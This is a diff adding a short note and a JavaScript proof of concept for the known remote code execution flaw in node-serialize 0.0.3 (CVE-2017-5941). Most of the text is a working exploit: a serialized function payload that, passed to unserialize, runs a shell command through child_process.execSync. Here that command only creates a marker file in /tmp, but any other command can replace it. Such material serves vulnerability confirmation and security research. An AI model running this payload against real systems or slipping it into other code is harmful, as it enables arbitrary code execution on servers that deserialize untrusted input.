@@ -1,0 +1,13 @@
+Confirmed: `unserialize` uses `eval()` on function-flagged values with no sanitization — classic node-serialize 0.0.3 RCE (CVE-2017-5941).
+
+```javascript
+var serialize = require("node-serialize");
+
+// Malicious payload: a serialized "function" whose IIFE executes arbitrary code
+var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned_by_node_serialize\')}()"}';
+
+// Triggering unserialize() on attacker-controlled input evals the function body
+var obj = serialize.unserialize(payload);
+
+console.log("Exploit triggered, obj.rce =", obj.rce);
+```
